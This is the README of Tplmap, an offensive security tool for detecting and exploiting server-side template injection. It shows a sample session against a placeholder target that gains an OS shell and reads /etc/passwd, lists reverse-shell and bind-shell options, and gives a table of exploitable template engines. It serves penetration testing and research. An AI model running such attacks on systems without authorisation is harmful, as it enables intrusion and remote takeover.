Tplmap
======

Tplmap (short for _Template Mapper_) automates the detection and exploitation of Server-Side Template Injection (SSTI) vulnerabilities to break-out the sandbox and achieve remote command execution on the remote operating system. 

The tool can be used as a testbed to conduct researches on the SSTI vulnerability class and as offensive security tool in penetration test engagements.

The sandbox break-out techniques came from public [researches][4] as James Kett's [Server-Side Template Injection: RCE For The Modern Web App][1] and other original piece of [works][2] to [extend][3] this tool capabilities.

It achieves full compromise in rendered context, several code context and blind injection scenarios. It also exploits _eval()_-like injections in several languages and generic unsandboxed template engines.

Example
-------

```
$ ./tplmap.py -u 'http://www.target.com/app?id=7'
[+] Tplmap 0.2
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'id' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Jade plugin is testing rendering with tag '\n= *\n'
[+] Jade plugin has confirmed injection with tag '\n= *\n'
[+] Tplmap identified the following injection point:

  GET parameter: id
  Engine: Jade
  Injection: \n= *\n
  Context: text
  OS: linux
  Technique: render
  Capabilities:

   Code evaluation: yes, javascript code
   Shell command execution: yes
   File write: yes
   File read: yes
   Bind and reverse shell: yes

[+] Rerun tplmap providing one of the following options:

    --os-shell or --os-cmd to execute shell commands via the injection
    --upload LOCAL REMOTE to upload files to the server
    --download REMOTE LOCAL to download remote files
    --bind-shell PORT to bind a shell on a port and connect to it
    --reverse-shell HOST PORT to run a shell back to the attacker's HOST PORT
          
$ ./tplmap.py -u 'http://www.target.com/app?id=7' --os-shell

[+] Run commands on the operating system.

linux $ whoami
www-data
linux $ ls -al /etc/passwd
-rw-r--r--  1 root  wheel  5925 16 Sep  2015 /etc/passwd
linux $

```

Supported template engines
--------------------------

| Template engine      | Techniques         | Command execution | Code evaluation | File read | File write |
|----------------------|--------------------|-------------------|-----------------|-----------|------------|
| Mako                 |  render/blind      | yes               | Python          | yes       | yes        |
| Jinja2               |  render/blind      | yes               | Python          | yes       | yes        |
| Python (generic)     |  render/blind      | yes               | Python          | yes       | yes        |
| Nunjucks             |  render/blind      | yes               | JavaScript      | yes       | yes        |
| Jade                 |  render/blind      | yes               | JavaScript      | yes       | yes        |
| doT                  |  render/blind      | yes               | JavaScript      | yes       | yes        |
| Marko                |  render/blind      | yes               | JavaScript      | yes       | yes        |
| JavaScript (generic) |  render/blind      | yes               | JavaScript      | yes       | yes        |
| Dust (<= dustjs-helpers@1.5.0) |  render/blind      | yes               | JavaScript      | yes       | yes        |
| Smarty (unsecured)   |  render/blind      | yes               | PHP             | yes       | yes        |
| PHP (generic)        |  render/blind      | yes               | PHP             | yes       | yes        |
| Freemarker           |  render/blind      | yes               | no              | yes       | yes        |
| Velocity             |  render/blind      | yes               | no              | yes       | yes        |
| Twig                 |  render            | no                | no              | no        | no         |
| Smarty (secured)     |  render            | no                | no              | no        | no         |
| Dust (> dustjs-helpers@1.5.0)  |  render            | no                | no              | no        | no         |

[1]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
[2]: https://github.com/epinna/tplmap/issues/9
[3]: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
[4]: https://artsploit.blogspot.co.uk/2016/08/pprce2.html
